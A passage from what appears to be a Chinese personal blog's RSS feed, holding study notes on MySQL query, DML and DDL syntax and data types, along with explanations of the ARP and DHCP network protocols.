&lt;tr>
&lt;th>函数&lt;/th>
&lt;th>功能&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>count&lt;/td>
&lt;td>统计数量&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>max&lt;/td>
&lt;td>最大值&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>min&lt;/td>
&lt;td>最小值&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>avg&lt;/td>
&lt;td>平均值&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>sum&lt;/td>
&lt;td>求和&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>语法&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>&lt;code>select 聚合函数(字段列表) from 表名;&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol>
&lt;h3 id="分组查询">分组查询
&lt;/h3>&lt;ol>
&lt;li>&lt;strong>语法&lt;/strong>
&lt;ul>
&lt;li>&lt;code>select 字段列表 from 表名 [where 条件] group by 分组字段名 [having 分组后的过滤条件]&lt;/code>
&lt;ul>
&lt;li>&lt;strong>where条件和having条件的区别&lt;/strong>:
&lt;ul>
&lt;li>执行时机不同:where是分组之前执行,不满足where条件,不参加分组,而having是对分组之后的结果进行过滤&lt;/li>
&lt;li>判断条件不同:where不能对聚合函数进行判断,而having可以&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol>
&lt;h3 id="排序查询">排序查询
&lt;/h3>&lt;ol>
&lt;li>&lt;strong>语法&lt;/strong>
&lt;ul>
&lt;li>&lt;code>select 字段列表 from 表名 order by 字段1 排序方式1,字段2 排序方式2;&lt;/code>
&lt;ul>
&lt;li>&lt;strong>排序方式&lt;/strong>:
&lt;ul>
&lt;li>asc：升序(默认)&lt;/li>
&lt;li>desc:降序&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol>
&lt;p>​ &lt;strong>注意&lt;/strong>:如果是多字段排序,当第一个字段值相同时,才会根据第二个字段进行排序&lt;/p>
&lt;h3 id="分页查询">分页查询
&lt;/h3>&lt;ol>
&lt;li>&lt;strong>语法&lt;/strong>
&lt;ul>
&lt;li>select 字段列表 from 表名 limit 起始索引,查询记录
&lt;ul>
&lt;li>&lt;strong>注意&lt;/strong>
&lt;ul>
&lt;li>起始索引从0开始,起始索引=(查询页码-1)*每页显示记录数&lt;/li>
&lt;li>分页查询是数据库的方言,因为不同的数据库有不同的是实现方法,MySQL中使用的是的limit&lt;/li>
&lt;li>如果查询的第一页数据,起始索引可以省略,直接简写成limit 10&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol>
&lt;h3 id="执行顺序和执行顺序">执行顺序和执行顺序
&lt;/h3>&lt;h4 id="编写顺序书写sql时的顺序">编写顺序（书写SQL时的顺序）
&lt;/h4>&lt;ol>
&lt;li>&lt;code>SELECT&lt;/code> - 字段列表&lt;/li>
&lt;li>&lt;code>FROM&lt;/code> - 表名列表&lt;/li>
&lt;li>&lt;code>WHERE&lt;/code> - 条件列表&lt;/li>
&lt;li>&lt;code>GROUP BY&lt;/code> - 分组字段列表&lt;/li>
&lt;li>&lt;code>HAVING&lt;/code> - 分组后条件列表&lt;/li>
&lt;li>&lt;code>ORDER BY&lt;/code> - 排序字段列表&lt;/li>
&lt;li>&lt;code>LIMIT&lt;/code> - 分页参数&lt;/li>
&lt;/ol>
&lt;h4 id="执行顺序数据库实际执行的顺序">执行顺序（数据库实际执行的顺序）
&lt;/h4>&lt;table>
&lt;thead>
&lt;tr>
&lt;th>顺序&lt;/th>
&lt;th>关键字&lt;/th>
&lt;th>作用&lt;/th>
&lt;th>对应编写顺序编号&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>1&lt;/td>
&lt;td>&lt;code>FROM&lt;/code>&lt;/td>
&lt;td>确定数据来源表&lt;/td>
&lt;td>2&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>2&lt;/td>
&lt;td>&lt;code>WHERE&lt;/code>&lt;/td>
&lt;td>行级条件过滤&lt;/td>
&lt;td>3&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>3&lt;/td>
&lt;td>&lt;code>GROUP BY&lt;/code>&lt;/td>
&lt;td>分组操作&lt;/td>
&lt;td>4&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>4&lt;/td>
&lt;td>&lt;code>HAVING&lt;/code>&lt;/td>
&lt;td>组级条件过滤&lt;/td>
&lt;td>5&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>5&lt;/td>
&lt;td>&lt;code>SELECT&lt;/code>&lt;/td>
&lt;td>选择输出字段/聚合计算&lt;/td>
&lt;td>1&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>6&lt;/td>
&lt;td>&lt;code>ORDER BY&lt;/code>&lt;/td>
&lt;td>结果排序&lt;/td>
&lt;td>6&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>7&lt;/td>
&lt;td>&lt;code>LIMIT&lt;/code>&lt;/td>
&lt;td>分页限制&lt;/td>
&lt;td>7&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table></description></item><item><title>Mysql DML语句使用</title><link>https://souljian.cn/p/746015764/</link><pubDate>Wed, 30 Apr 2025 20:22:44 +0800</pubDate><guid>https://souljian.cn/p/746015764/</guid><description>&lt;h2 id="dml语句数据库操作语言用来对数据库表中的数据进行增删改">DML语句(数据库操作语言，用来对数据库表中的数据进行增删改)
&lt;/h2>&lt;h3 id="添加数据">添加数据
&lt;/h3>&lt;ul>
&lt;li>给指定字段添加数据&lt;code>insert into 表名(字段名1，字段名2,...)values(值1，值2,...&lt;/code>&lt;/li>
&lt;li>给全部字段添加数据&lt;code>insert into 表名 values(值1，值2,...)&lt;/code>&lt;/li>
&lt;li>批量添加数据&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">insert into 表名(字段名1，字段名2,...)values(值1,值2,...),(值1,值2,...),(值1,值2,...) //为当前表中指定字段赋值
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">insert into 表名 values(值1,值2,...),(值1,值2,...),(值1,值2,...) //为当前表中所有字段赋值
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;strong>注意&lt;/strong>：&lt;/p>
&lt;ul>
&lt;li>插入数据是，指定的字段顺序需要与值的顺序是一 一对应的&lt;/li>
&lt;li>字符串类型和日期类型需要包含在引号中&lt;/li>
&lt;li>插入的数据大小，应该在字段的规定范围内&lt;/li>
&lt;/ul>
&lt;h3 id="修改数据">修改数据
&lt;/h3>&lt;ul>
&lt;li>修改表中的数据&lt;code>update 表名 set 字段1=值1，字段2=值2,...[where 条件]&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>注意&lt;/strong>：修改语句的条件可以有，也可以没有，如果没有条件，则会修改整张表的所有数据&lt;/p>
&lt;h3 id="删除数据">删除数据
&lt;/h3>&lt;ul>
&lt;li>删除表中的数据 &lt;code>delete from 表名 [where 条件]&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>**注意 ** :&lt;/p>
&lt;ul>
&lt;li>delete 语句的条件可以有,也可以没有,.如果没有条件,则会删除整张表的所有数据&lt;/li>
&lt;li>delete 语句不能删除某一个字段的值(可以使用update)&lt;/li>
&lt;/ul></description></item><item><title>Mysql数据类型</title><link>https://souljian.cn/p/745939264/</link><pubDate>Tue, 29 Apr 2025 23:07:44 +0800</pubDate><guid>https://souljian.cn/p/745939264/</guid><description>&lt;ul>
&lt;li>
&lt;h3 id="数据类型">数据类型
&lt;/h3>&lt;/li>
&lt;/ul>
&lt;h4 id="mysql-数值类型">MySQL 数值类型
&lt;/h4>&lt;table>
&lt;thead>
&lt;tr>
&lt;th>分类&lt;/th>
&lt;th>类型&lt;/th>
&lt;th>大小&lt;/th>
&lt;th>有符号(SIGNED)范围&lt;/th>
&lt;th>无符号(UNSIGNED)范围&lt;/th>
&lt;th>描述&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>数值类型&lt;/td>
&lt;td>TINYINT&lt;/td>
&lt;td>1 byte&lt;/td>
&lt;td>(-128, 127)&lt;/td>
&lt;td>(0, 255)&lt;/td>
&lt;td>小整数值&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>数值类型&lt;/td>
&lt;td>SMALLINT&lt;/td>
&lt;td>2 bytes&lt;/td>
&lt;td>(-32768, 32767)&lt;/td>
&lt;td>(0, 65535)&lt;/td>
&lt;td>大整数值&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>数值类型&lt;/td>
&lt;td>MEDIUMINT&lt;/td>
&lt;td>3 bytes&lt;/td>
&lt;td>(-8388608, 8388607)&lt;/td>
&lt;td>(0, 16777215)&lt;/td>
&lt;td>大整数值&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>数值类型&lt;/td>
&lt;td>INT/INTEGER&lt;/td>
&lt;td>4 bytes&lt;/td>
&lt;td>(-2147483648, 2147483647)&lt;/td>
&lt;td>(0, 4294967295)&lt;/td>
&lt;td>大整数值&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>数值类型&lt;/td>
&lt;td>BIGINT&lt;/td>
&lt;td>8 bytes&lt;/td>
&lt;td>(-2^63, 2^63-1)&lt;/td>
&lt;td>(0, 2^64-1)&lt;/td>
&lt;td>极大整数值&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>数值类型&lt;/td>
&lt;td>FLOAT&lt;/td>
&lt;td>4 bytes&lt;/td>
&lt;td>约(-3.4E+38, 3.4E+38)&lt;/td>
&lt;td>约(0, 3.4E+38)&lt;/td>
&lt;td>单精度浮点数&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>数值类型&lt;/td>
&lt;td>DOUBLE&lt;/td>
&lt;td>8 bytes&lt;/td>
&lt;td>约(-1.8E+308, 1.8E+308)&lt;/td>
&lt;td>约(0, 1.8E+308)&lt;/td>
&lt;td>双精度浮点数&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>数值类型&lt;/td>
&lt;td>DECIMAL&lt;/td>
&lt;td>可变&lt;/td>
&lt;td>取决于M(精度)和D(标度)&lt;/td>
&lt;td>取决于精度和标度&lt;/td>
&lt;td>精确小数&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h4 id="mysql-字符串类型">MySQL 字符串类型
&lt;/h4>&lt;table>
&lt;thead>
&lt;tr>
&lt;th>分类&lt;/th>
&lt;th>类型&lt;/th>
&lt;th>大小&lt;/th>
&lt;th>描述&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>字符串类型&lt;/td>
&lt;td>CHAR&lt;/td>
&lt;td>0-255 bytes&lt;/td>
&lt;td>定长字符串&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>字符串类型&lt;/td>
&lt;td>VARCHAR&lt;/td>
&lt;td>0-65535 bytes&lt;/td>
&lt;td>变长字符串&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>字符串类型&lt;/td>
&lt;td>TINYBLOB&lt;/td>
&lt;td>0-255 bytes&lt;/td>
&lt;td>不超过255个字符的二进制数据&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>字符串类型&lt;/td>
&lt;td>TINYTEXT&lt;/td>
&lt;td>0-255 bytes&lt;/td>
&lt;td>短文本字符串&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>字符串类型&lt;/td>
&lt;td>BLOB&lt;/td>
&lt;td>0-65535 bytes&lt;/td>
&lt;td>二进制形式的长文本数据&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>字符串类型&lt;/td>
&lt;td>TEXT&lt;/td>
&lt;td>0-65535 bytes&lt;/td>
&lt;td>长文本数据&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>字符串类型&lt;/td>
&lt;td>MEDIUMBLOB&lt;/td>
&lt;td>0-16,777,215 bytes&lt;/td>
&lt;td>二进制形式的中等长度文本数据&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>字符串类型&lt;/td>
&lt;td>MEDIUMTEXT&lt;/td>
&lt;td>0-16,777,215 bytes&lt;/td>
&lt;td>中等长度文本数据&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>字符串类型&lt;/td>
&lt;td>LONGBLOB&lt;/td>
&lt;td>0-4,294,967,295 bytes&lt;/td>
&lt;td>二进制形式的极大文本数据&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>字符串类型&lt;/td>
&lt;td>LONGTEXT&lt;/td>
&lt;td>0-4,294,967,295 bytes&lt;/td>
&lt;td>极大文本数据&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h4 id="mysql-日期和时间类型">MySQL 日期和时间类型
&lt;/h4>&lt;table>
&lt;thead>
&lt;tr>
&lt;th>分类&lt;/th>
&lt;th>类型&lt;/th>
&lt;th>大小(字节)&lt;/th>
&lt;th>范围&lt;/th>
&lt;th>格式&lt;/th>
&lt;th>描述&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>日期类型&lt;/td>
&lt;td>DATE&lt;/td>
&lt;td>3&lt;/td>
&lt;td>1000-01-01 至 9999-12-31&lt;/td>
&lt;td>YYYY-MM-DD&lt;/td>
&lt;td>纯日期值&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>日期类型&lt;/td>
&lt;td>TIME&lt;/td>
&lt;td>3&lt;/td>
&lt;td>-838:59:59 至 838:59:59&lt;/td>
&lt;td>HH:MM:SS&lt;/td>
&lt;td>时间值或持续时间&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>日期类型&lt;/td>
&lt;td>YEAR&lt;/td>
&lt;td>1&lt;/td>
&lt;td>1901 至 2155&lt;/td>
&lt;td>YYYY&lt;/td>
&lt;td>年份值&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>日期类型&lt;/td>
&lt;td>DATETIME&lt;/td>
&lt;td>8&lt;/td>
&lt;td>1000-01-01 00:00:00 至 9999-12-31 23:59:59&lt;/td>
&lt;td>YYYY-MM-DD HH:MM:SS&lt;/td>
&lt;td>混合日期和时间值&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>日期类型&lt;/td>
&lt;td>TIMESTAMP&lt;/td>
&lt;td>4&lt;/td>
&lt;td>1970-01-01 00:00:01 至 2038-01-19 03:14:07&lt;/td>
&lt;td>YYYY-MM-DD HH:MM:SS&lt;/td>
&lt;td>时间戳（自动时区转换）&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table></description></item><item><title>Mysql DDL语句使用</title><link>https://souljian.cn/p/745939143/</link><pubDate>Tue, 29 Apr 2025 23:05:43 +0800</pubDate><guid>https://souljian.cn/p/745939143/</guid><description>&lt;h2 id="ddl语句数据定义语言用来定义数据库中的数据库表字段">DDL语句(数据定义语言，用来定义数据库中的（数据库、表、字段)):
&lt;/h2>&lt;h3 id="ddl语句操作数据库">DDL语句操作数据库
&lt;/h3>&lt;p>&lt;strong>查询&lt;/strong>：&lt;/p>
&lt;ul>
&lt;li>查询所有数据库 &lt;code>show databases; &lt;/code>&lt;/li>
&lt;li>查询当前数据库&lt;code>select database();&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>创建&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>创建&lt;code>crrate database [if not exists] 数据库名 [default charset]字符集[collate]排序规则&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>删除&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>删除&lt;code>drop database [if exists]数据库名&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>使用&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>使用&lt;code>use 数据库名&lt;/code>&lt;/li>
&lt;/ul>
&lt;h3 id="ddl语句-操作表">DDL语句-操作表
&lt;/h3>&lt;h4 id="创建表">创建表
&lt;/h4>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">create table 表名(
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 字段1 字段1类型[COMMENT 字段1注释],
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 字段2 字段2类型[COMMENT 字段2注释],
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 字段3 字段3类型[COMMENT 字段3注释],
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ...
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 字段n 字段n类型[COMMENT 字段n注释]
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">)[COMMENT 表注释];
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">注意: ...为可选参数,最后一个字段后面没有逗号
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h4 id="修改表">修改表
&lt;/h4>&lt;ul>
&lt;li>添加字段 &lt;code>alter table 表名 add 字段名 类型(长度) [comment 注释][约束];&lt;/code>&lt;/li>
&lt;li>修改数据类型&lt;code>alter table 表名 modify 字段名 新数据类型(长度)&lt;/code>&lt;/li>
&lt;li>修改字段名的字段类型&lt;code>alter table 表名 change 旧字段名 新字段名 类型(长度)[comment 注释][约束]&lt;/code>&lt;/li>
&lt;li>删除字段&lt;code>alter table 表名 drop 字段名&lt;/code>&lt;/li>
&lt;li>修改表名&lt;code>alter table 表名 rename to 新表名&lt;/code>&lt;/li>
&lt;/ul>
&lt;h4 id="查询表">查询表
&lt;/h4>&lt;ul>
&lt;li>
&lt;p>查询当前数据库所有表&lt;code>show tables; &lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>查询表结构 &lt;code>desc 表名&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>查询指定表的建表语句&lt;code>show create table 表名&lt;/code>&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h4 id="删除表">删除表
&lt;/h4>&lt;ul>
&lt;li>
&lt;p>清空表内数据(删除表并重新创建新表)&lt;code>truncate table 表名&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>删除指定表表&lt;code>drop table[if exists]表名&lt;/code>&lt;/p>
&lt;/li>
&lt;/ul></description></item><item><title>ARP协议</title><link>https://souljian.cn/p/745333266/</link><pubDate>Tue, 22 Apr 2025 22:47:46 +0800</pubDate><guid>https://souljian.cn/p/745333266/</guid><description>&lt;h2 id="一arp协议简介">一、ARP协议简介
&lt;/h2>&lt;ul>
&lt;li>
&lt;p>&lt;strong>定义&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>ARP（Address Resolution Protocol，地址解析协议）是一种网络协议，用于将网络层的IP地址解析为链路层的MAC地址。&lt;/li>
&lt;li>它是网络通信的基础协议之一，确保数据能够在同一网络内部正确传输。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>工作原理&lt;/strong>&lt;/p>
&lt;ol>
&lt;li>
&lt;p>&lt;strong>ARP请求&lt;/strong>：&lt;/p>
&lt;ul>
&lt;li>当主机A需要向主机B发送数据时，它会先检查自己的ARP缓存，看是否已经存储了主机B的IP地址与MAC地址的映射关系。&lt;/li>
&lt;li>如果没有找到，主机A会在本地网络中广播一个ARP请求报文，询问&amp;quot;谁拥有IP地址X？请告诉我你的MAC地址。&amp;quot;&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>ARP响应&lt;/strong>：&lt;/p>
&lt;ul>
&lt;li>主机B收到ARP请求后，会发送一个ARP响应报文，告诉主机A自己的MAC地址。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>更新ARP缓存&lt;/strong>：&lt;/p>
&lt;ul>
&lt;li>主机A收到响应后，将主机B的IP地址和MAC地址的映射关系存储在自己的ARP缓存中，以便后续通信。&lt;/li>
&lt;li>ARP缓存中的条目有一定的生存时间（TTL），过期后会被删除，以避免缓存中的信息过时。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol>
&lt;/li>
&lt;/ul>
&lt;h2 id="二arp协议的作用">二、ARP协议的作用
&lt;/h2>&lt;ul>
&lt;li>
&lt;p>&lt;strong>IP地址与MAC地址的转换&lt;/strong>：&lt;/p>
&lt;ul>
&lt;li>IP地址是网络层的逻辑地址，用于在不同网络之间进行路由。&lt;/li>
&lt;li>MAC地址是链路层的物理地址，用于在同一网络内部进行数据传输。&lt;/li>
&lt;li>ARP协议通过将IP地址解析为MAC地址，确保数据能够在同一网络内部正确传输。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>支持网络通信&lt;/strong>：&lt;/p>
&lt;ul>
&lt;li>ARP协议是网络通信的基础协议之一，它与IP协议、TCP协议等协同工作，确保数据能够在网络中正确传输。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h2 id="三arp协议的限制">三、ARP协议的限制
&lt;/h2>&lt;ul>
&lt;li>
&lt;p>&lt;strong>仅限于同一网络&lt;/strong>：&lt;/p>
&lt;ul>
&lt;li>ARP协议仅适用于同一局域网内部的通信，无法跨网络工作。&lt;/li>
&lt;li>跨网络的通信需要通过路由器进行IP地址的路由。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>安全性问题&lt;/strong>：&lt;/p>
&lt;ul>
&lt;li>ARP协议本身没有加密或认证机制，容易受到ARP攻击。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h2 id="四例子解释说明">四、例子解释说明
&lt;/h2>&lt;p>假设在一个局域网中有两台主机：主机A（IP地址为192.168.1.100，MAC地址为00:11:22:33:44:55）和主机B（IP地址为192.168.1.101，MAC地址为AA:BB:CC:DD:EE:FF）。&lt;/p>
&lt;ol>
&lt;li>
&lt;p>&lt;strong>主机A需要向主机B发送数据&lt;/strong>：&lt;/p>
&lt;ul>
&lt;li>主机A检查自己的ARP缓存，发现没有主机B的IP地址与MAC地址的映射关系。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>主机A发送ARP请求&lt;/strong>：&lt;/p>
&lt;ul>
&lt;li>主机A在局域网中广播一个ARP请求报文：&amp;ldquo;谁拥有IP地址192.168.1.101？请告诉我你的MAC地址。&amp;rdquo;&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>主机B响应ARP请求&lt;/strong>：&lt;/p>
&lt;ul>
&lt;li>主机B收到ARP请求后，发送一个ARP响应报文：&amp;ldquo;我是192.168.1.101，我的MAC地址是AA:BB:CC:DD:EE:FF。&amp;rdquo;&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>主机A更新ARP缓存&lt;/strong>：&lt;/p>
&lt;ul>
&lt;li>主机A收到ARP响应后，将主机B的IP地址和MAC地址的映射关系存储在自己的ARP缓存中。&lt;/li>
&lt;li>之后，主机A就可以直接使用主机B的MAC地址发送数据了。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol></description></item><item><title>DHCP协议及IP自动获取</title><link>https://souljian.cn/p/745333232/</link><pubDate>Tue, 22 Apr 2025 22:47:12 +0800</pubDate><guid>https://souljian.cn/p/745333232/</guid><description>&lt;h1 id="">
&lt;/h1>&lt;h2 id="一dhcp协议简介">一、DHCP协议简介
&lt;/h2>&lt;p>&lt;strong>采用UDP协议，67/68端口&lt;/strong>&lt;/p>
&lt;p>DHCP（Dynamic Host Configuration Protocol，动态主机配置协议）是一种网络协议，用于自动分配IP地址和其他网络配置参数（如子网掩码、默认网关、DNS服务器地址等）。它简化了网络设备的配置过程，尤其是对于频繁接入和离开网络的设备（如笔记本电脑、手机等）。&lt;/p>
&lt;h2 id="二dhcp工作原理">二、DHCP工作原理
&lt;/h2>&lt;p>DHCP协议的工作过程主要分为以下几个阶段：&lt;/p>
&lt;h3 id="1-发现阶段discovery">1. 发现阶段（Discovery）
&lt;/h3>&lt;ul>
&lt;li>当设备（如电脑）接入网络时，它会广播一个 &lt;strong>DHCP Discover 数据包&lt;/strong>，询问网络中是否有可用的DHCP服务器。&lt;/li>
&lt;li>由于设备还不知道自己属于哪个网络，因此它会使用广播地址（如 &lt;code>255.255.255.255&lt;/code>）发送数据包。&lt;/li>
&lt;/ul>
&lt;h3 id="2-提供阶段offer">2. 提供阶段（Offer）
&lt;/h3>&lt;ul>
&lt;li>网络中的DHCP服务器收到 &lt;strong>DHCP Discover 数据包&lt;/strong> 后，会从其可用的IP地址池中选择一个未分配的IP地址，并向客户端发送一个 &lt;strong>DHCP Offer 数据包&lt;/strong>。&lt;/li>
&lt;li>&lt;strong>DHCP Offer 数据包&lt;/strong> 中包含分配给客户端的IP地址、子网掩码、租期（IP地址的有效时间，有线默认8天，无线默认8小时）以及其他网络配置参数。&lt;/li>
&lt;/ul>
&lt;h3 id="3-请求阶段request">3. 请求阶段（Request）
&lt;/h3>&lt;ul>
&lt;li>客户端收到 &lt;strong>DHCP Offer 数据包&lt;/strong> 后，会发送一个 &lt;strong>DHCP Request 数据包&lt;/strong>，正式请求接受这个IP地址。&lt;/li>
&lt;li>如果客户端收到多个DHCP服务器的Offer（在多台DHCP服务器的环境中），它会选择一个Offer，并向所有DHCP服务器发送 &lt;strong>DHCP Request 数据包&lt;/strong>，通知其他服务器它已经选择了某个IP地址。&lt;/li>
&lt;/ul>
&lt;h3 id="4-确认阶段acknowledge">4. 确认阶段（Acknowledge）
&lt;/h3>&lt;ul>
&lt;li>DHCP服务器收到 &lt;strong>DHCP Request 数据包&lt;/strong> 后，会检查所分配的IP地址是否仍然可用。&lt;/li>
&lt;li>如果IP地址可用，服务器会发送一个 &lt;strong>DHCP Ack 数据包&lt;/strong>，正式确认分配的IP地址，并通知客户端可以使用该IP地址。&lt;/li>
&lt;li>如果IP地址已经被占用或其他问题导致无法分配，服务器会发送一个 &lt;strong>DHCP Nak 数据包&lt;/strong>，拒绝分配，并提示客户端重新请求（从第一阶段重来）。&lt;/li>
&lt;/ul>
&lt;h2 id="三dhcp的优势">三、DHCP的优势
&lt;/h2>&lt;ul>
&lt;li>&lt;strong>自动化配置&lt;/strong>：设备接入网络后自动获取IP地址，无需手动配置，大大简化了网络管理。&lt;/li>
&lt;li>&lt;strong>避免冲突&lt;/strong>：DHCP服务器会检查IP地址是否已被占用，从而避免IP地址冲突。&lt;/li>
&lt;li>&lt;strong>集中管理&lt;/strong>：网络管理员可以通过DHCP服务器集中管理IP地址分配，方便调整网络配置。&lt;/li>
&lt;li>&lt;strong>灵活性&lt;/strong>：可以根据需要动态调整IP地址池和租期，适应不同的网络需求。&lt;/li>
&lt;/ul>
&lt;h2 id="四dhcp的局限性">四、DHCP的局限性
&lt;/h2>&lt;ul>
&lt;li>&lt;strong>依赖服务器&lt;/strong>：如果DHCP服务器故障，新设备将无法获取IP地址。&lt;/li>
&lt;li>&lt;strong>安全性问题&lt;/strong>：未经授权的设备可能会接入网络并获取IP地址，存在安全隐患。&lt;/li>
&lt;li>&lt;strong>配置复杂性&lt;/strong>：在大型网络中，配置和管理DHCP服务器可能较为复杂。&lt;/li>
&lt;/ul>
&lt;h2 id="五dhcp的生动例子">五、DHCP的生动例子
&lt;/h2>&lt;p>假设你去参加一个大型聚会，但你不知道自己的座位在哪里。于是你开始了一段寻找座位的旅程：&lt;/p>
&lt;ol>
&lt;li>&lt;strong>发现阶段（Discovery）&lt;/strong>
你进入聚会场地后，大声喊：&amp;ldquo;有人能告诉我我的座位在哪里吗？&amp;quot;（广播 &lt;strong>DHCP Discover 数据包&lt;/strong>）。&lt;/li>
&lt;li>&lt;strong>提供阶段（Offer）&lt;/strong>
聚会的主持人（DHCP服务器）听到你的喊声后，查看座位安排表（IP地址池），找到一个空座位，并对你说：&amp;ldquo;你可以坐那边的座位。&amp;quot;（发送 &lt;strong>DHCP Offer 数据包&lt;/strong>）。&lt;/li>
&lt;li>&lt;strong>请求阶段（Request）&lt;/strong>
